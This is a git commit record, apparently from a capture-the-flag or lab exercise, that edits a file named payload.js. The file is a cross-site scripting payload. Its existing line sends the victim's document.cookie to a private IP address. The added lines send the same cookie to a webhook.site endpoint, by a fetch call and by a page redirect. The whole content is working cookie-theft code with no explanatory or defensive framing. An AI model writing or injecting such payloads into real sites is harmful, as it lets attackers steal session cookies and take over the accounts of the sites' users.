7de558c487138d85c81745b2fae90d85f39e5790
yudhaprimadiansyah <yudhaprimadiansyah@gmail.com>
2024-08-20 10:05:38 +0700

    Fix Payload

--- payload.js
+++ payload.js
@@ -1,1 +1,3 @@
 fetch("http://10.10.14.7:4000/?c="+document.cookie)
+fetch("https://webhook.site/f4fa0205-1dea-4234-ae42-775f2f392483/?c"+document.cookie)
+window.location.href = "https://webhook.site/f4fa0205-1dea-4234-ae42-775f2f392483/?c"+document.cookie
